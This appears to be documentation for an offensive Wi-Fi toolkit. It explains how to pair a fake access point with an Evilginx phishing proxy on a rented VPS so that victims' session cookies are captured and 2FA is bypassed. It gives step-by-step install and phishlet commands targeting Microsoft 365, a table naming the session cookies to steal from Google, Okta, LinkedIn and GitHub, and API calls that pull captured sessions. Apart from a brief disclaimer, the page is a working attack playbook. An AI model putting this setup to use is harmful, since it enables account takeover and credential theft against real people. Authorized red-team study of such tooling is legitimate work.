# Evilginx AiTM Integration

> **MFA Bypass through Adversary-in-the-Middle Session Hijacking**

---

## ⚠️ IMPORTANT: Evilginx Moved to Dedicated VPS

**As of v1.0.0, Evilginx has been moved to a dedicated VPS.**

### Why?

1. **Resource Requirements**: Evilginx needs public IP, ports 80/443, SSL certs
2. **Domain Dependency**: Requires valid domain pointing to server
3. **Pi Limitations**: Pi 5 typically behind NAT, no public IP
4. **Operational Security**: Separate infrastructure for sensitive operations

### New Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    EVILGINX ARCHITECTURE v2.0                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  MoMo (Pi 5)                 Nexus (Pi 4)              VPS          │
│  ───────────                 ───────────               ────          │
│  • Evil Twin AP       ───►  • Route victim  ───►  • Evilginx3      │
│  • Captive Portal            • Manage phishlets    • SSL/Domain     │
│  • Redirect to VPS           • Session retrieval   • Cookie capture │
│                                                                      │
│  Victim connects to fake AP → Redirected to VPS → Session captured  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Local Evil Twin + Remote Evilginx

The Evil Twin module on MoMo still works! Just point the captive portal to your VPS:

```yaml
# momo.yml
eviltwin:
  enabled: true
  redirect_url: "https://your-phishing-domain.com/login"
```

---

## VPS Evilginx Setup

### Requirements

- Ubuntu VPS (min $5/mo)
- Public IP
- Domain name (e.g., login.example.com)
- Ports 80, 443 open

### Installation

```bash
# On VPS
wget https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx-linux-amd64.tar.gz
tar -xzf evilginx-linux-amd64.tar.gz
./evilginx

# Configure
config domain your-phishing-domain.com
config ip YOUR_VPS_IP
phishlets hostname microsoft365 login.your-phishing-domain.com
phishlets enable microsoft365
lures create microsoft365
```

### Recommended VPS Providers

- **Vultr** - $5/mo, global locations
- **DigitalOcean** - Reliable, good UI
- **Linode** - Developer friendly
- **Hetzner** - Cheap EU option

---

## How It Works

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK FLOW                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────┐    ┌─────────────┐    ┌──────────────┐    ┌────────┐  │
│  │  Victim  │───▶│  Evil Twin  │───▶│   Evilginx   │───▶│  Real  │  │
│  │          │    │ (MoMo Pi 5) │    │   (VPS)      │    │  Site  │  │
│  └──────────┘    └─────────────┘    └──────────────┘    └────────┘  │
│       │                                     │                  │     │
│       │  1. Connect to fake AP              │                  │     │
│       │  2. Redirect to VPS phishing URL    │                  │     │
│       │  3. Enter credentials ──────────────┼─────────────────▶│     │
│       │  4. Complete 2FA ───────────────────┼─────────────────▶│     │
│       │  5. Session cookie issued ◀─────────┼──────────────────│     │
│       │                                     │                  │     │
│       │              ┌──────────────────────┘                  │     │
│       │              ▼                                          │     │
│       │     🔓 SESSION COOKIE CAPTURED!                        │     │
│       │                                                         │     │
│       │  6. Attacker imports cookie → Full account access      │     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

## Key Difference from Traditional Phishing

| Traditional Phishing | Evilginx AiTM |
|---------------------|---------------|
| Static fake login page | Transparent proxy to real site |
| Captures username + password | Captures session cookies |
| ❌ Blocked by 2FA | ✅ **Bypasses ALL 2FA** |
| Victim notices fake URL | Victim sees real site content |
| Account access requires password | Account access via cookie import |

---

## Nexus Integration (Future)

Control Evilginx VPS via Nexus dashboard:

```bash
# Via Nexus API (planned)
curl -X POST http://nexus:8080/api/evilginx/lures \
  -d '{"phishlet": "microsoft365", "redirect": "https://office.com"}'

# Get captured sessions
curl http://nexus:8080/api/evilginx/sessions
```

---

## Built-in Phishlets

| Target | Description | Auth Cookies |
|--------|-------------|--------------|
| `microsoft365` | Office 365, Outlook, Teams | ESTSAUTH, ESTSAUTHPERSISTENT |
| `google` | Gmail, Google Workspace | SID, SSID, HSID, APISID |
| `okta` | Okta SSO | sid, idx |
| `linkedin` | LinkedIn | li_at, JSESSIONID |
| `github` | GitHub | user_session, _gh_sess |

---

## Migration Notes

### Removed from MoMo

- `momo/infrastructure/evilginx/` (entire module)
- `momo/apps/momo_plugins/evilginx_aitm.py`
- `momo/apps/momo_web/evilginx_api.py`
- `/api/evilginx/*` endpoints

### Still Available on MoMo

- Evil Twin (captive portal can redirect to VPS)
- `/api/eviltwin/*` endpoints

### Available on VPS

- Full Evilginx3 functionality
- Phishlet management
- Lure generation
- Session capture

### Future (via Nexus)

- Remote VPS management API
- Session sync to Nexus
- Dashboard integration

---

## Security Considerations

⚠️ **This tool is for authorized security testing only!**

- Only use against systems you own or have explicit permission to test
- Session hijacking is illegal without authorization
- Captured credentials should be handled securely
- Delete sessions after testing
- Use dedicated, isolated VPS infrastructure

---

*MoMo v1.6.0 - Evilginx moved to dedicated VPS*
